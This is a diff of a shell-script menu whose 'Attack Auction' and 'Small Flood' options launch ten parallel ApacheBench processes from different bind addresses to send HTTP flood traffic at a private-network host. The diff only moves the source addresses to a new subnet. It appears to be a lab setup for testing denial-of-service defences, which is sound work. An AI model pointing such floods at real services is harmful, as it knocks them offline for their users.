@@ -7,16 +7,16 @@ do
     case $opt in
         "Attack Auction")
             echo "Start attack"
-            ab -B 10.1.17.221 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.222 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.223 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.224 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.225 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.226 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.227 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.228 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.229 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.220 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.221 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.222 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.223 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.224 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.225 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.226 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.227 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.228 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.229 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.220 -s 300 -l -r -n 10000000 -c 100 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
             ;;
         "Attack End")
             echo "Terminate attack"
@@ -25,16 +25,16 @@ do
             ;;
         "Small Flood")
             echo "Start attack"
-            ab -B 10.1.17.221 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.222 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.223 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.224 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.225 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.226 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.227 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.228 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.229 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
-            ab -B 10.1.17.220 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.221 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.222 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.223 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.224 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.225 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.226 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.227 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.228 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.229 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
+            ab -B 10.1.20.220 -s 300 -l -r -n 10000000 -c 10 -k -H "Accept-Encoding: gzip, deflate" http://10.1.20.11/ &
             ;;
 
         "Quit")
